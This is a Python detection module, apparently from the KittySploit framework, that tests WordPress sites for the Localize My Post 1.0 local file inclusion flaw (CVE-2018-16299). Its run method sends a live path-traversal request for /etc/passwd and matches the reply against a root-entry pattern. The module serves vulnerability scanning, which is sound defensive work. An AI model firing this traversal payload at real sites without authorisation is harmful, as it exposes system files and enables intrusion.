#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Localize My Post 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Localize My Post 1.0 - Local File Inclusion Detection',
        'description': 'WordPress Localize My Post 1.0 is susceptible to local file inclusion via the ajax/include.php file parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'wordpress', 'lfi', 'plugin', 'wp', 'edb', 'packetstorm', 'localize_my_post_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/45439',
            'https://packetstormsecurity.com/files/149433/WordPress-Localize-My-Post-1.0-Local-File-Inclusion.html',
            'https://github.com/julianburr/wp-plugin-localizemypost/issues/1',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-16299',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-16299',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="WordPress Localize My Post 1.0 - Local File Inclusion detected",
                path='/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd',
            )
            return True
        return False

